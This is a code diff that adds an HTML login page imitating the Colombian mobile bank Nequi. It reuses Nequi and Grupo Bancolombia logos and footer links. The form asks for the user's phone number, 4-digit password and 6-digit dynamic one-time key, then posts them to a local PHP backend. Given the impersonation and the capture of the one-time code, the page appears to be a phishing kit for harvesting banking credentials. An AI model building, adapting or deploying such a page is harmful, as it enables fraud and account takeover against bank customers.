@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Nequi Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- CSS externo -->
+  <link rel="stylesheet" href="assets/css/login.css">
+
+  <!-- Fuente opcional de Google -->
+  <link href="https://fonts.googleapis.com/css?family=Inter&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="nequi-bg-squares">
+    <div class="nequi-bg-square sq1"></div>
+    <div class="nequi-bg-square sq2"></div>
+    <div class="nequi-bg-square sq3"></div>
+    <div class="nequi-bg-square sq4"></div>
+  </div>
+
+  <div class="nequi-login-wrapper">
+    <div class="nequi-login-container">
+      <h1>Entra a tu Nequi</h1>
+      <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+      
+      <!-- 🔹 Ruta backend -->
+      <form method="POST" action="../backend/loginServiceAuthentication.php" autocomplete="off">
+        <div class="nequi-field">
+          <div class="input-group">
+            <span class="input-indicativo">
+              <span class="flag">🇨🇴</span>
+              +57
+              <span class="arrow">&#9660;</span>
+            </span>
+            <input type="tel" id="j_username" name="j_username" class="input-celular"
+              placeholder="Número de celular" maxlength="10" minlength="10"
+              pattern="[0-9]{10}" required autocomplete="off">
+          </div>
+        </div>
+
+        <div class="nequi-field">
+          <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
+        </div>
+
+        <div class="nequi-field">
+          <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
+        </div>
+
+        <div class="captcha-box">
+          <div class="captcha-error"></div>
+          <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
+        </div>
+
+        <button type="submit" class="nequi-btn">Entra</button>
+      </form>
+    </div>
+  </div>
+
+  <footer class="nequi-footer">
+    <div class="footer-main">
+      <div class="footer-row footer-logo-row">
+        <div class="footer-logo">
+          <span class="footer-logo-dot">•</span><span>Nequi</span>
+        </div>
+        <div class="footer-store-icons">
+          <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg" alt="Google Play">
+          <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg" alt="App Store">
+          <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg" alt="AppGallery">
+        </div>
+        <div class="footer-bancolombia">
+          <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg" alt="Grupo Bancolombia">
+        </div>
+      </div>
+
+      <hr class="footer-separator">
+
+      <ul class="footer-menu-list">
+        <li class="footer-menu-item">Información legal <span class="arrow">&#8250;</span></li>
+        <li class="footer-menu-item">Para personas <span class="arrow">&#8250;</span></li>
+        <li class="footer-menu-item">Para tu negocio <span class="arrow">&#8250;</span></li>
+        <li class="footer-menu-item">Ayuda <span class="arrow">&#8250;</span></li>
+        <li class="footer-menu-item">Conócenos <span class="arrow">&#8250;</span></li>
+      </ul>
+    </div>
+  </footer>
+
+  <!-- reCAPTCHA -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</body>
+</html>
